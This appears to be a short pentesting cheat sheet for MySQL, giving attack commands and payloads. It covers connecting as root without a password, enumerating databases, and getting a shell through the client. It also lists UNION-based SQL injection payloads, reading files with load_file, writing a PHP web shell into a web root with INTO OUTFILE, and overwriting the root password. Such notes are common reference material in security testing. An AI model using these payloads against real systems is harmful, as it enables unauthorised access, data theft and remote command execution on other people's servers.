MySql
========================

## Accessing locally

    mysql -u root # Connect to root without password
    mysql -u root -p # A password will be asked (check someone)
    
## Accessing remote

    mysql -h <Hostname> -u root
    mysql -h <Hostname> -u root@localhost


## Commands

    mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
    mysql -u root -h 127.0.0.1 -e 'show databases;'

    show databases;
    use <database>;
    show tables;
    describe <table_name>;
    show columns from <table>;
    
    select version(); #version
    select @@version(); #version
    select user(); #User
    select database(); #database name
    
## Get a shell with the mysql client user
        
    \! sh
    
## Basic MySQLi

    Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
    Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"
    
## Read & Write
 
 OBS You need FILE privilege to read & write to files.
    
    select load_file('/var/lib/mysql-files/key.txt'); #Read file
    select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
 
## Try to change MySQL root password
   
    UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
    UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
    FLUSH PRIVILEGES;
    quit;
